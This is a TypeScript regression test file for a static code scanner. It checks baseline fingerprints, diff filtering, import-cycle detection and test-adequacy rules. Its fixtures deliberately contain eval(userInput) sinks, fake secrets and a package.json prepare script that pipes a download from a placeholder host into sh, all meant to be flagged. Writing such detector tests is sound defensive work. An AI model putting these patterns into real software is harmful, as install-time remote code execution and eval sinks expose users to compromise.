// Regression tests for baseline identity, history output, project graph rules, and discovery behavior.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { chdir, cwd } from "node:process";
import test from "node:test";
import { analyse } from "./cli.ts";
import type { AnalysisReport } from "./cli.ts";
import {
  analyseFixture,
  analyseProject,
  evalFindingFiles,
  gitAvailable,
  HIGH_ENTROPY_FIXTURE_VALUE,
  REPO_ROOT,
  TS_IGNORE_DIRECTIVE,
  writeFixtureFiles,
} from "./test-fixtures.ts";

test("expanded scanner keeps pre-expansion fingerprints stable", () => {
  // Fixture covers legacy fingerprint anchors across representative rule families.
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string, g: string, h: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f, g, h);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const fingerprints = new Map(report.findings.map((finding) => [finding.ruleId, finding.fingerprint]));
  assert.equal(fingerprints.get("security.eval-call"), "9597745a32e48f52");
  assert.equal(fingerprints.get("size.parameter-count"), "d616356804967e11");
  assert.equal(fingerprints.get("test-quality.no-assertions"), "abc482609c475b4f");
  assert.equal(fingerprints.get("modernisation.public-property"), "c80058bf4fd46024");
});

test("baseline round trip suppresses old and new findings by identity tuple", () => {
  const projectDir = mkdtempSync(join(tmpdir(), "gruff-ts-"));
  const baselineDir = mkdtempSync(join(tmpdir(), "gruff-ts-baseline-"));
  const previous = cwd();
  try {
    writeBaselineRoundTripFixture(projectDir);
    chdir(projectDir);
    assert.equal(assertBaselineRoundTrip(baselineDir) > 0, true);
  } finally {
    chdir(previous);
    rmSync(projectDir, { recursive: true, force: true });
    rmSync(baselineDir, { recursive: true, force: true });
  }
});

test("working-tree diff scans staged and untracked files", () => {
  if (!gitAvailable()) {
    return;
  }
  withCommittedGitFixture(
    "gruff-ts-diff-",
    WORKING_TREE_DIFF_BASE_FIXTURE,
    (projectDir) => {
      writeFixtureFiles(projectDir, WORKING_TREE_DIFF_RISKY_FIXTURE);
      execFileSync("git", ["add", "staged.ts"], { stdio: "ignore" });

      const report = analyse({ ...baselineRoundTripOptions(), diff: "working-tree" });
      const evalFiles = report.findings.filter((finding) => finding.ruleId === "security.eval-call").map((finding) => finding.filePath).sort();
      assert.deepEqual(evalFiles, ["staged.ts", "untracked.ts"]);
    },
  );
});

test("changed ranges keep findings from a newly edited method only", () => {
  const report = analyseProject(
    {
      "src/example.ts": `function stale(userInput: string): unknown {
  return eval(userInput);
}

function changed(userInput: string): unknown {
  return eval(userInput);
}
`,
    },
    { paths: ["src/example.ts"], changedRanges: "6-6" },
  );

  assert.deepEqual(evalFindingLines(report), [6]);
  assert.equal(report.suppressedCount !== undefined && report.suppressedCount > 0, true);
});

test("changed ranges include signature findings when the method body changed", () => {
  const report = analyseProject(
    {
      "src/example.ts": `function stable(userInput: string): unknown {
  return eval(userInput);
}

function changed(unusedValue: string): void {
  return;
}
`,
    },
    { paths: ["src/example.ts"], changedRanges: "6-6" },
  );

  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unused-parameter" && finding.symbol === "changed"), true);
  assert.equal(report.findings.some((finding) => finding.ruleId === "security.eval-call" && finding.line === 2), false);
});

test("hunk changed scope excludes unchanged signature findings", () => {
  const report = analyseProject(
    {
      "src/example.ts": `function changed(unusedValue: string): void {
  return;
}
`,
    },
    { paths: ["src/example.ts"], changedRanges: "2-2", changedScope: "hunk" },
  );

  assert.equal(report.findings.some((finding) => finding.ruleId === "waste.unused-parameter"), false);
  assert.equal(report.suppressedCount !== undefined && report.suppressedCount > 0, true);
});

test("changed ranges suppress pre-existing findings outside the changed region", () => {
  const report = analyseProject(
    {
      "src/example.ts": `function stale(userInput: string): unknown {
  return eval(userInput);
}

const editedValue = 1;
`,
    },
    { paths: ["src/example.ts"], changedRanges: "5-5" },
  );

  assert.deepEqual(report.findings.filter((finding) => finding.ruleId === "security.eval-call"), []);
  assert.equal(report.suppressedCount !== undefined && report.suppressedCount > 0, true);
});

test("working-tree diff treats untracked files as whole-file changed", () => {
  if (!gitAvailable()) {
    return;
  }
  withCommittedGitFixture(
    "gruff-ts-untracked-region-",
    WORKING_TREE_DIFF_BASE_FIXTURE,
    (projectDir) => {
      writeFixtureFiles(projectDir, {
        "untracked.ts": `function untracked(userInput: string): unknown {
  return eval(userInput);
}
`,
      });

      const report = analyse({ ...baselineRoundTripOptions(), diff: "working-tree" });
      assert.deepEqual([...evalFindingFiles(report)], ["untracked.ts"]);
      assert.equal(report.suppressedCount, 0);
    },
  );
});

test("CLI changed-region analysis exits zero with fail-on none", () => {
  const projectDir = mkdtempSync(join(tmpdir(), "gruff-ts-changed-cli-"));
  try {
    writeFixtureFiles(projectDir, {
      "bad.ts": `function changed(userInput: string): unknown {
  return eval(userInput);
}
`,
    });
    const output = execFileSync("bash", [join(REPO_ROOT, "bin/gruff-ts"), "analyse", "--format=json", "--fail-on=none", "--no-config", "--no-baseline", "--changed-ranges", "2-2", "bad.ts"], { cwd: projectDir, encoding: "utf8" });
    const payload = JSON.parse(output) as AnalysisReport;
    assert.equal(payload.findings.some((finding) => finding.ruleId === "security.eval-call"), true);
  } finally {
    rmSync(projectDir, { recursive: true, force: true });
  }
});

// Fixture purpose: committed baseline file proves `--diff=working-tree` does not report unchanged
// content once the temp git repository has an initial commit.
const WORKING_TREE_DIFF_BASE_FIXTURE = {
  "stable.ts": `export function stable(): string {
  return "ok";
}
`,
};

// Fixture purpose: one staged file and one untracked file both contain the same security sink so
// the diff filter must union staged and untracked paths.
const WORKING_TREE_DIFF_RISKY_FIXTURE = {
  "staged.ts": `export function staged(input: string): unknown {
  return eval(input);
}
`,
  "untracked.ts": `export function untracked(input: string): unknown {
  return eval(input);
}
`,
};

// Stable contract: extracts line anchors for eval findings so hunk-filtering tests stay deterministic.
function evalFindingLines(report: AnalysisReport): number[] {
  return report.findings
    .filter((finding) => finding.ruleId === "security.eval-call")
    .map((finding) => finding.line ?? 0)
    .sort((left, right) => left - right);
}

// Writes a temporary git repository, commits the initial files, and restores cwd afterwards.
// Spawns only fixed `git` argv calls so the diff-mode regression can observe real index state.
function withCommittedGitFixture(prefix: string, files: Record<string, string>, run: (projectDir: string) => void): void {
  const projectDir = mkdtempSync(join(tmpdir(), prefix));
  const previous = cwd();
  try {
    writeFixtureFiles(projectDir, files);
    chdir(projectDir);
    execFileSync("git", ["init"], { stdio: "ignore" });
    execFileSync("git", ["config", "user.email", "fixture@example.test"], { stdio: "ignore" });
    execFileSync("git", ["config", "user.name", "Fixture"], { stdio: "ignore" });
    execFileSync("git", ["add", "."], { stdio: "ignore" });
    execFileSync("git", ["commit", "-m", "initial"], { stdio: "ignore" });
    run(projectDir);
  } finally {
    chdir(previous);
    rmSync(projectDir, { recursive: true, force: true });
  }
}

/** Writes a temporary project that exercises baseline identity across current rule families. */
function writeBaselineRoundTripFixture(projectDir: string): void {
  writeFileSync(
    join(projectDir, "bad.ts"),
    `const embeddedToken = "${HIGH_ENTROPY_FIXTURE_VALUE}";

export function unsafePublicApi(input: any): any {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as unknown as { name?: string };
  return user!.name;
}

async function unsafe(userInput: string, userIds: string[]): Promise<void> {
  eval(userInput);
  new Function(userInput)();
  userIds.forEach(async (userId) => {
    await sendEmailAsync(userId);
  });
  sendEmailAsync(userIds[0]);
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // FIXME
  }
  throw "dynamic failure";
}
`,
  );
  writeFileSync(
    join(projectDir, "package.json"),
    JSON.stringify({
      scripts: {
        prepare: "curl https://example.test/install.sh | sh",
      },
      dependencies: {
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
    }),
  );
  writeFileSync(
    join(projectDir, "tsconfig.json"),
    JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
  );
  mkdirSync(join(projectDir, "src", "cycle"), { recursive: true });
  writeFixtureFiles(projectDir, {
    "src/cycle/a.ts": `import { fromB } from "./b";

export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";

export function fromB(): string {
  return fromA();
}
`,
  });
}

/** Verifies generated, suppressed, and mismatched baseline entries by stable fingerprint identity. */
function assertBaselineRoundTrip(baselineDir: string): number {
  const baseOptions = baselineRoundTripOptions();
  const report = analyse(baseOptions);
  assertBaselineRoundTripRuleIds(report);

  const baselinePath = join(baselineDir, "baseline.json");
  analyse({ ...baseOptions, generateBaseline: baselinePath });
  const baseline = readBaselineRoundTripFile(baselinePath);
  const entries = baseline.entries ?? [];
  const [target] = entries;
  assertBaselineEntryMetadata(baseline.schemaVersion, target);

  const suppressed = analyse({ ...baseOptions, shouldSkipBaseline: false, baseline: baselinePath });
  assert.equal(suppressed.baseline?.suppressed, report.findings.length);
  assert.equal(suppressed.findings.length, 0);
  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-rule.json", baseline, target, (entry) => ({ ...entry, ruleId: "security.wrong-rule" }));
  assertMismatchedBaselineEntryReportsFinding(baselineDir, "wrong-file.json", baseline, target, (entry) => ({ ...entry, filePath: "other.ts" }));
  return report.findings.length;
}

/** Returns stable analysis options for baseline identity assertions. */
function baselineRoundTripOptions() {
  return {
    paths: ["."],
    shouldSkipConfig: true,
    format: "json" as const,
    failOn: "none" as const,
    shouldIncludeIgnored: false,
    changedScope: "symbol" as const,
    shouldSkipBaseline: true,
  };
}

/** Proves the baseline fixture still covers each representative rule family in the stable contract. */
function assertBaselineRoundTripRuleIds(report: AnalysisReport): void {
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "security.eval-call",
    "security.new-function",
    "sensitive-data.high-entropy-string",
    "modernisation.double-cast",
    "security.async-foreach",
    "waste.swallowed-catch",
    "security.remote-install-script",
    "modernisation.tsconfig-strict-disabled",
    "design.circular-import",
  ]) {
    assert.equal(ruleIds.has(ruleId), true);
  }
}

type BaselineRoundTripEntry = {
  fingerprint: string;
  ruleId: string;
  filePath: string;
  line?: number;
  symbol?: string;
  message?: string;
};

type BaselineRoundTripFile = {
  schemaVersion?: string;
  entries?: BaselineRoundTripEntry[];
};

/** Reads baseline JSON through the fixture-specific shape used by these assertions. */
function readBaselineRoundTripFile(path: string): BaselineRoundTripFile {
  return JSON.parse(readFileSync(path, "utf8")) as BaselineRoundTripFile;
}

/** Narrows the first baseline entry after checking stable identity fields. */
function assertBaselineEntryMetadata(schemaVersion: string | undefined, target: BaselineRoundTripEntry | undefined): asserts target is BaselineRoundTripEntry {
  assert.equal(schemaVersion, "gruff.baseline.v1");
  assert.ok(target);
  assert.equal(typeof target.fingerprint, "string");
  assert.equal(typeof target.ruleId, "string");
  assert.equal(typeof target.filePath, "string");
  assert.equal(typeof target.message, "string");
}

/** Confirms a changed identity tuple no longer suppresses the original finding. */
function assertMismatchedBaselineEntryReportsFinding(
  baselineDir: string,
  fileName: string,
  baseline: BaselineRoundTripFile,
  target: BaselineRoundTripEntry,
  mutateFirstEntry: (entry: BaselineRoundTripEntry) => BaselineRoundTripEntry,
): void {
  const path = join(baselineDir, fileName);
  const entries = (baseline.entries ?? []).map((entry, index) => (index === 0 ? mutateFirstEntry(entry) : entry));
  writeFileSync(path, JSON.stringify({ ...baseline, entries }));
  const report = analyse({ ...baselineRoundTripOptions(), shouldSkipBaseline: false, baseline: path });
  assert.equal(report.findings.some((finding) => finding.fingerprint === target.fingerprint && finding.ruleId === target.ruleId && finding.filePath === target.filePath), true);
}

test("score report is deterministic for repeated expanded scans", () => {
  const files = {
    "alpha.ts": `export class Alpha {
  public name = "alpha";
}

function unsafe(value: string): void {
  eval(value);
  new Function(value)();
}
`,
    "beta.ts": `function route(value: string): string {
  if (value === "a") return "a";
  if (value === "b") return "b";
  if (value === "c") return "c";
  if (value === "d") return "d";
  if (value === "e") return "e";
  return "z";
}
`,
  };
  const first = analyseProject(files);
  const second = analyseProject(files);
  assert.deepEqual(first.score, second.score);
  assert.deepEqual(
    first.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
    second.findings.map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.fingerprint]),
  );
});

// Fixture covers deterministic project graph findings for deep imports and cycles; the deep path
// and two-file cycle are intentional because the fingerprint contract must stay stable across
// discovery permutations.
const CROSS_FILE_GRAPH_FIXTURE = {
  "src/app/feature/controller.ts": `import { sharedValue } from "../../../shared/value";
import { startCycle } from "../cycle/a";

export function renderController(): string {
  return sharedValue + startCycle();
}
`,
  "src/app/cycle/a.ts": `import { fromB } from "./b";

export function startCycle(): string {
  return fromB();
}
`,
  "src/app/cycle/b.ts": `import { startCycle } from "./a";

export function fromB(): string {
  return startCycle();
}
`,
  "src/shared/value.ts": `export const sharedValue = "shared";
`,
  "src/large.ts": Array.from({ length: 20 }, (_, index) => `export const largeValue${index} = ${index};`).join("\n"),
};

const CROSS_FILE_GRAPH_CONFIG = {
  rules: {
    "design.large-module-concentration": { threshold: 40, severity: "advisory", options: { minFiles: 4, minLines: 8 } },
  },
};

test("project architecture index finds deterministic cross-file findings", () => {
  const first = analyseProject(CROSS_FILE_GRAPH_FIXTURE, { config: CROSS_FILE_GRAPH_CONFIG });
  const second = analyseProject(CROSS_FILE_GRAPH_FIXTURE, { config: CROSS_FILE_GRAPH_CONFIG });
  const ruleIds = new Set(first.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("design.deep-relative-import"), true);
  assert.equal(ruleIds.has("design.circular-import"), true);
  assert.equal(ruleIds.has("design.large-module-concentration"), true);
  assert.deepEqual(
    first.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
    second.findings
      .filter((finding) => finding.ruleId.startsWith("design."))
      .map((finding) => [finding.filePath, finding.line, finding.ruleId, finding.symbol, finding.fingerprint]),
  );
});

test("circular import finding is stable across source iteration order", () => {
  const first = analyseProject({
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
  });
  const second = analyseProject({
    "src/cycle/b.ts": `import { fromA } from "./a";
export function fromB(): string {
  return fromA();
}
`,
    "src/cycle/a.ts": `import { fromB } from "./b";
export function fromA(): string {
  return fromB();
}
`,
  });
  const firstCycle = first.findings.find((finding) => finding.ruleId === "design.circular-import");
  const secondCycle = second.findings.find((finding) => finding.ruleId === "design.circular-import");
  assert.ok(firstCycle);
  assert.ok(secondCycle);
  assert.deepEqual(
    [firstCycle.filePath, firstCycle.line, firstCycle.symbol, firstCycle.fingerprint],
    [secondCycle.filePath, secondCycle.line, secondCycle.symbol, secondCycle.fingerprint],
  );
});

test("project graph ignores type-only import cycles", () => {
  const report = analyseProject({
    "src/types/a.ts": `import type { B } from "./b";
export interface A {
  b: B;
}
`,
    "src/types/b.ts": `import type { A } from "./a";
export interface B {
  a: A;
}
`,
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "design.circular-import"), false);
});

// Fixture for the test-adequacy rule sweep: covers missing-nearby-test, snapshot-only,
// no-throw-only, plus exemption paths for `.d.ts`, fixtures/, and generated/.
const TEST_ADEQUACY_FIXTURE = {
  "src/payments.ts": `export function chargeCard(): string {
  return "charged";
}
`,
  "src/users.ts": `export function renderUser(): string {
  return "user";
}
`,
  "src/users.test.ts": `import assert from "node:assert/strict";
import { renderUser } from "./users";

test("renders user", () => {
  assert.equal(renderUser(), "user");
});

test("snapshot only", () => {
  expect(renderUser()).toMatchSnapshot();
});

test("no throw only", () => {
  assert.doesNotThrow(() => renderUser());
});
`,
  "src/types.d.ts": `export interface GeneratedContract {
  id: string;
}
`,
  "fixtures/sample.ts": `export function fixtureOnly(): string {
  return "fixture";
}
`,
  "src/generated/client.ts": `export function generatedClient(): string {
  return "generated";
}
`,
};

test("project test adequacy checks nearby coverage and shallow tests", () => {
  const report = analyseProject(TEST_ADEQUACY_FIXTURE);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("test-quality.missing-nearby-test"), true);
  assert.equal(ruleIds.has("test-quality.snapshot-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-throw-only-test"), true);
  assert.equal(ruleIds.has("test-quality.no-assertions"), false);

  const missingTestPaths = report.findings.filter((finding) => finding.ruleId === "test-quality.missing-nearby-test").map((finding) => finding.filePath);
  assert.deepEqual(missingTestPaths, ["src/payments.ts"]);
});

test("project test adequacy accepts central tests that import the source", () => {
  const report = analyseProject({
    "src/cli/audit/check-agent-setup.ts": `export function checkAgentSetup(): string {
  return "ok";
}
`,
    "test/unit/audit-command.test.ts": `import assert from "node:assert/strict";
import {
  checkAgentSetup,
} from "../../src/cli/audit/check-agent-setup";

test("checks agent setup", () => {
  assert.equal(checkAgentSetup(), "ok");
});
`,
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.missing-nearby-test"), false);
});

test("project test adequacy retains global-style top-level tests", () => {
  const report = analyseProject({
    "src/payment.ts": `export function paymentStatus(): string {
  return "paid";
}
`,
    "test/unit/payment.test.ts": `test("payment status", () => {
  expect(true).toBe(true);
});
`,
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "test-quality.missing-nearby-test"), false);
});

test("gitignore parser handles escaped literals, character classes, spaces, and non-special doublestar", () => {
  const report = analyseProject(GITIGNORE_EDGE_CASE_FIXTURE);
  const evalFiles = report.findings.filter((finding) => finding.ruleId === "security.eval-call").map((finding) => finding.filePath);
  assert.deepEqual(evalFiles, ["foo/bar/baz.js"]);
});

// Fixture purpose: gitignore parser edge cases where git treats escaped `!`, escaped spaces,
// character classes, and non-special `**` differently from a plain glob parser.
const GITIGNORE_EDGE_CASE_FIXTURE = {
  ".gitignore": `[Tt]emp/
\\!literal.ts
literal\\ space.ts
foo/**.js
`,
  "Temp/ignored.ts": `export function ignored(input: string): unknown {
  return eval(input);
}
`,
  "!literal.ts": `export function literal(input: string): unknown {
  return eval(input);
}
`,
  "literal space.ts": `export function spaced(input: string): unknown {
  return eval(input);
}
`,
  "foo/file.js": `export function shallow(input) {
  return eval(input);
}
`,
  "foo/bar/baz.js": `export function nested(input) {
  return eval(input);
}
`,
};

test("expanded scanner config disables and overrides new rules", () => {
  const source = `API_TOKEN=qR8vT3mK6pL9xS2nD4eG

function branchLightly(input: string): string {
  if (input === "a") return "a";
  if (input === "b") return "b";
  return "c";
}
`;
  const report = analyseFixture(source, {
    fileName: ".env.ts",
    config: {
      rules: {
        "sensitive-data.hardcoded-env-value": { enabled: false },
        "complexity.cyclomatic": { threshold: 2, severity: "warning" },
      },
    },
  });
  assert.equal(report.findings.some((finding) => finding.ruleId === "sensitive-data.hardcoded-env-value"), false);
  assert.equal(report.findings.some((finding) => finding.ruleId === "complexity.cyclomatic"), true);
});
